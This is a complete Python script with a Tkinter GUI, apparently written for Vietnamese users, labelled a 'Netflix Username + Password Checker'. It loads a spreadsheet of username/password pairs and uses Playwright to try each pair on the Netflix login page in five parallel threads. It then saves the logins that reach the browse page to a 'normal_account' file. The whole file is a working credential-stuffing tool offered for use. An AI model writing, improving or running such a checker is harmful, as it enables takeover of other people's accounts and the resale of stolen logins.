import os
import sys
import io
import pandas as pd
import logging
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from tkinter import filedialog, Tk, Button, Label, messagebox
from playwright.sync_api import sync_playwright, TimeoutError

# Cấu hình file xuất
GOOD_FILE = "normal_account/normal_account.xlsx"
TV_FILE = "tv_account/TV_account.xlsx"
MAX_WORKERS = 5

# Tạo thư mục nếu chưa tồn tại
os.makedirs("normal_account", exist_ok=True)
os.makedirs("tv_account", exist_ok=True)

# Khắc phục UnicodeEncodeError trên Windows terminal
if sys.platform.startswith("win"):
    try:
        sys.stdout.reconfigure(encoding='utf-8')  # Python 3.7+
    except AttributeError:
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Thiết lập logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("check_pass.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout)
    ]
)

def check_login(username, password):
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)
            context = browser.new_context()
            page = context.new_page()

            # 1) Truy cập trang login
            page.goto("https://www.netflix.com/vn/login", wait_until="domcontentloaded")
            page.wait_for_timeout(3000)

            # 2) Nhập username và password bằng fill()
            try:
                page.locator('input[name="userLoginId"]').fill(username)
                page.locator('input[name="password"]').fill(password)
            except Exception as e:
                browser.close()
                return "error", f"Lỗi khi điền form: {e}"

            # 3) Nhấn Enter để submit từ ô password
            try:
                page.locator('input[name="password"]').press("Enter")
            except Exception as e:
                browser.close()
                return "error", f"Lỗi khi nhấn Enter: {e}"

            # 4) Đợi phản hồi
            page.wait_for_timeout(10000)
            current_url = page.url.lower()
            browser.close()

            # 5) Xác định kết quả
            if "/browse" in current_url:
                return "valid", "Đăng nhập thành công"
            else:
                return "invalid", f"Đăng nhập thất bại - {current_url}"

    except Exception as e:
        try:
            browser.close()
        except:
            pass
        return "error", f"Lỗi không xác định: {e}"

def process_file(filepath):
    try:
        if filepath.lower().endswith(('.xls', '.xlsx')):
            df = pd.read_excel(filepath, engine='openpyxl')
        elif filepath.lower().endswith('.csv'):
            df = pd.read_csv(filepath)
        else:
            messagebox.showerror("Lỗi", "File không hợp lệ. Chỉ hỗ trợ Excel (.xls, .xlsx) hoặc CSV.")
            return
    except Exception as e:
        messagebox.showerror("Lỗi", f"Không đọc file: {e}")
        return

    if 'username' not in df.columns or 'password' not in df.columns:
        messagebox.showerror("Lỗi định dạng", "File phải có cột 'username' và 'password'")
        return

    valid_accounts, tv_accounts = [], []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(check_login, row['username'], row['password']): (idx, row)
            for idx, row in df.iterrows()
        }
        for future in as_completed(futures):
            idx, row = futures[future]
            status, reason = future.result()
            logging.info(f"#{idx+1} {row['username']}: {status} - {reason}")
            if status == "valid":
                valid_accounts.append(row)
            else:
                tv_accounts.append(row)

    pd.DataFrame(valid_accounts).to_excel(GOOD_FILE, index=False)
    pd.DataFrame(tv_accounts).to_excel(TV_FILE, index=False)
    messagebox.showinfo(
        "Hoàn thành",
        f"{len(valid_accounts)} tài khoản đúng → {GOOD_FILE}\n{len(tv_accounts)} tài khoản sai → {TV_FILE}"
    )

def main_gui():
    root = Tk()
    root.title("Netflix Username + Password Checker")
    root.geometry("420x200")
    label = Label(root, text="Chọn file tài khoản Netflix (username + password)", font=("Arial", 12))
    label.pack(pady=20)
    Button(
        root,
        text="Chọn & Bắt đầu",
        font=("Arial", 12),
        command=lambda: threading.Thread(
            target=lambda: process_file(
                filedialog.askopenfilename(
                    title="Chọn file",
                    filetypes=[("Excel", "*.xls;*.xlsx; *.csv")]
                ) or ''
            )
        ).start()
    ).pack(pady=10)
    root.mainloop()

if __name__ == "__main__":
    main_gui()
